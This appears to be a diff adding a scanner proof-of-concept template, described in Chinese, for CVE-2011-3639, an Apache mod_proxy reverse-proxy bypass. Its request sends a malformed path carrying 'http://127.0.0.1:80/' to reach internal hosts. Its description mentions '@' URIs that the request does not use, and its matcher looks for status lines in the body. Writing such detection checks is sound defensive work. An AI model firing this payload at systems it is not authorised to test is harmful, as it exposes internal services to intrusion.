@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测 Apache HTTP Server mod_proxy 反向代理安全绕过漏洞。通过发送包含 @ 符号的畸形 URI 或直接请求内部主机，验证代理是否将请求转发至内网服务器，绕过 RewriteRule/ProxyPassMatch 限制。"
+id = "POC-AVE-2011-0226"
+name = "Apache HTTP Server mod_proxy 反向代理安全绕过漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2011-3639",
+    "apache",
+    "mod_proxy",
+    "reverse-proxy-bypass",
+]
+vuln_id = [
+    "CVE-2011-3639",
+    "AVE-2011-0226",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/http://127.0.0.1:80/"
+protocol = "http"
+
+[poc.requests.headers]
+Host = "{{Hostname}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "HTTP/1.1 200",
+    "HTTP/1.0 200",
+]
